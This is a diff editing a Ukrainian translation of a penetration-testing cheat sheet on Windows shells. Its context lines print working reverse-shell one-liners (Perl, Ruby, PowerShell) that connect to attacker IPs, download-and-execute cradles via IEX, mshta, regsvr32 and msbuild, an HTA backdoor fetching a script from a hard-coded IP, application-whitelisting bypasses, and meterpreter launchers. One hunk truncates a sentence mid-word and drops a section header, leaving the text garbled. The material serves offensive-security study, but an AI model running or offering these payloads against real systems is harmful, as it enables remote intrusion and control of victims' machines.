@@ -27,7 +27,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) є портативною та безпечною альтернативою Netcat**. Він працює на системах, подібних до Unix, та Win32. З такими функціями, як сильне шифрування, виконання програм, налаштовувані вихідні порти та безперервне перепідключення, sbd забезпечує універсальне рішення для TCP/IP зв'язку. Для користувачів Windows версія sbd.exe з дистрибутиву Kali Linux може бути використана як надійна заміна Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) є портативною та безпечною альтернативою Netcat**. Він працює на системах, подібних до Unix, та Win32. Завдяки таким функціям, як сильне шифрування, виконання програм, налаштовувані вихідні порти та безперервне перепідключення, sbd забезпечує універсальне рішення для TCP/IP зв'язку. Для користувачів Windows версія sbd.exe з дистрибутиву Kali Linux може бути використана як надійна заміна Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -49,7 +49,7 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-## Рубі
+## Ruby
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -82,22 +82,18 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Процес, що виконує мережевий виклик: **powershell.exe**\
-Пейлоад записано на диск: **НІ** (_принаймні, ніде, де я міг би знайти за допомогою procmon!_)
+Payload записано на диск: **НІ** (_принаймні, ніде, де я міг би знайти за допомогою procmon!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Процес, що виконує мережевий виклик: **svchost.exe**\
-Пейлоад записано на диск: **WebDAV client local cache**
+Payload записано на диск: **Локальний кеш клієнта WebDAV**
 
 **Однорядковий код:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Отримайте більше інформації про різні оболонки Powershell в кінці цього документа**
-
-## Mshta
-
-- [Звідси](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+**Отримайте більше
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -109,7 +105,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Приклад hta-psh зворотного шеллу (використовуйте hta для завантаження та виконання PS бекдору)**
+#### **Приклад зворотного шелу hta-psh (використовуйте hta для завантаження та виконання PS бекдору)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -224,7 +220,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 #### Regsvr32 -sct
 
 [**Звідси**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -332,7 +328,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Ви можете використовувати цю техніку, щоб обійти обмеження на білий список додатків та Powershell.exe. Ви будете запрошені з PS shell.\
+Ви можете використовувати цю техніку, щоб обійти Application Whitelisting та обмеження Powershell.exe. Ви будете запрошені з PS shell.\
 Просто завантажте це та виконайте: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -345,7 +341,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Ви можете завантажити базовий C# reverse shell звідси: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Ви можете завантажити базову C# reverse shell звідси: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Не виявлено**
 
@@ -375,7 +371,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-У папці **Shells** є багато різних шелів. Щоб завантажити та виконати Invoke-_PowerShellTcp.ps1_, скопіюйте скрипт і додайте в кінець файлу:
+У папці **Shells** є багато різних оболонок. Щоб завантажити та виконати Invoke-_PowerShellTcp.ps1_, скопіюйте скрипт і додайте в кінець файлу:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -420,7 +416,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Створіть запускник powershell, збережіть його у файл і завантажте та виконайте його.
+Створіть запусковий файл PowerShell, збережіть його у файл і завантажте та виконайте його.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -438,7 +434,7 @@ python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
 msfconsole -r unicorn.rc
 ```
-Запустіть веб-сервер, що обслуговує файл _powershell_attack.txt_ та виконайте його на жертві:
+Запустіть веб-сервер, що обслуговує файл _powershell_attack.txt_, і виконайте його на жертві:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
